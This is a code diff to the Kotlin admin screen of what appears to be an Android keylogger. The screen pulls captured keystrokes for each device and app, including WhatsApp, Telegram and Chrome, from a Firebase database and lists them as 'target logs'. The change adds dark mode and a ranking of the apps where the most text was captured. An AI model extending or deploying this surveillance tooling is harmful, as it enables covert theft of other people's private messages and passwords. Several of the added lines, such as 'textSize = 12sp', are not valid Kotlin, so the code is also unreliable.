@@ -6,9 +6,11 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
+import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.appcompat.app.AppCompatDelegate
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.firebase.FirebaseApp
@@ -26,14 +28,24 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
     private lateinit var txtGlobalLogConsole: TextView
+    private lateinit var containerTopApps: LinearLayout
+    private lateinit var btnDarkModeToggle: Button
+
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
+    private var isDarkMode = false
 
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true
+    )
+
+    data class LogEntry(
+        val timestamp: Long,
+        val appName: String,
+        val text: String
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -48,6 +60,19 @@ class AdminMainActivity : AppCompatActivity() {
         txtTotalDevices = findViewById(R.id.txtTotalDevices)
         txtTotalEvents = findViewById(R.id.txtTotalEvents)
         txtGlobalLogConsole = findViewById(R.id.txtGlobalLogConsole)
+        containerTopApps = findViewById(R.id.containerTopApps)
+        btnDarkModeToggle = findViewById(R.id.btnDarkModeToggle)
+
+        btnDarkModeToggle.setOnClickListener {
+            isDarkMode = !isDarkMode
+            if (isDarkMode) {
+                AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_YES)
+                btnDarkModeToggle.text = "☀️ Light"
+            } else {
+                AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
+                btnDarkModeToggle.text = "🌙 Dark"
+            }
+        }
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
@@ -74,7 +99,7 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView.adapter = adapter
 
         loadConnectedDevices()
-        loadGlobalLogs()
+        loadGlobalLogsAndAnalytics()
     }
 
     private fun loadConnectedDevices() {
@@ -155,18 +180,31 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
-    private fun loadGlobalLogs() {
+    private fun getPrettyAppName(pkg: String): String {
+        return when {
+            pkg.contains("whatsapp", true) -> "🟢 WhatsApp"
+            pkg.contains("chrome", true) -> "🌐 Chrome"
+            pkg.contains("youtube", true) -> "🔴 YouTube"
+            pkg.contains("instagram", true) -> "📸 Instagram"
+            pkg.contains("dialer", true) -> "📞 Phone"
+            pkg.contains("telegram", true) -> "✈️ Telegram"
+            pkg.contains("settings", true) -> "⚙️ Settings"
+            else -> "📱 ${pkg.substringAfterLast('.')}"
+        }
+    }
+
+    private fun loadGlobalLogsAndAnalytics() {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val sb = StringBuilder()
+                val allEntries = mutableListOf<LogEntry>()
+                val appCounts = mutableMapOf<String, Int>()
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
-                var eventCount = 0
 
                 for (deviceChild in snapshot.children) {
-                    val deviceName = deviceChild.key ?: continue
                     for (appChild in deviceChild.children) {
-                        val appName = appChild.key ?: continue
+                        val rawApp = appChild.key ?: continue
+                        val prettyApp = getPrettyAppName(rawApp)
                         for (entry in appChild.children) {
                             val text = entry.child("text").getValue(String::class.java)
                                 ?: entry.child("title").getValue(String::class.java)
@@ -174,21 +212,103 @@ class AdminMainActivity : AppCompatActivity() {
                                 ?: continue
 
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
-                            val timeStr = timeFormat.format(Date(timestampMillis))
 
                             if (text.isNotBlank() && text != "null") {
-                                eventCount++
-                                sb.append("$timeStr  |  $appName  |  $text\n")
+                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
+                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
                             }
                         }
                     }
                 }
-                txtTotalEvents.text = eventCount.toString()
+
+                // Sort latest activity on top (descending timestamp)
+                allEntries.sortByDescending { it.timestamp }
+
+                txtTotalEvents.text = allEntries.size.toString()
+
+                val sb = StringBuilder()
+                for (item in allEntries) {
+                    val timeStr = timeFormat.format(Date(item.timestamp))
+                    sb.append("$timeStr  |  ${item.appName}  |  ${item.text}\n")
+                }
                 txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."
+
+                // Update Top Applications breakdown
+                updateTopAppsUI(appCounts, allEntries.size)
             }
 
             override fun onCancelled(error: DatabaseError) {}
         })
+    }
+
+    private fun updateTopAppsUI(appCounts: Map<String, Int>, totalEvents: Int) {
+        containerTopApps.removeAllViews()
+        val sortedApps = appCounts.entries.sortedByDescending { it.value }.take(3)
+
+        if (sortedApps.isEmpty()) {
+            val emptyTv = TextView(this).apply {
+                text = "No application data yet."
+                textSize = 12sp
+                setTextColor(Color.parseColor("#666666"))
+            }
+            containerTopApps.addView(emptyTv)
+            return
+        }
+
+        for ((appName, count) in sortedApps) {
+            val percent = if (totalEvents > 0) (count * 100) / totalEvents else 0
+
+            val itemLayout = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                setPadding(0, 8, 0, 8)
+            }
+
+            val labelRow = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+            }
+
+            val nameTv = TextView(this).apply {
+                text = appName
+                textSize = 13sp
+                textStyle = android.graphics.Typeface.BOLD
+                textColor = Color.parseColor("#1A1A1A")
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
+            }
+
+            val countTv = TextView(this).apply {
+                text = "$count ($percent%)"
+                textSize = 12sp
+                textColor = Color.parseColor("#666666")
+            }
+
+            labelRow.addView(nameTv)
+            labelRow.addView(countTv)
+            itemLayout.addView(labelRow)
+
+            val barBg = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                background = getDrawable(android.R.drawable.screen_background_dark_transparent) // placeholder or simple shape
+                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 8).apply { topMargin = 4 }
+                setBackgroundColor(Color.parseColor("#E0E0E0"))
+            }
+
+            val barFill = View(this).apply {
+                val weight = if (percent > 0) percent.toFloat() / 100f else 0.01f
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
+                setBackgroundColor(Color.parseColor("#0277BD"))
+            }
+
+            val barEmpty = View(this).apply {
+                val weight = if (percent < 100) (100 - percent).toFloat() / 100f else 0.01f
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
+            }
+
+            barBg.addView(barFill)
+            barBg.addView(barEmpty)
+            itemLayout.addView(barBg)
+
+            containerTopApps.addView(itemLayout)
+        }
     }
 
     class DeviceAdapter(
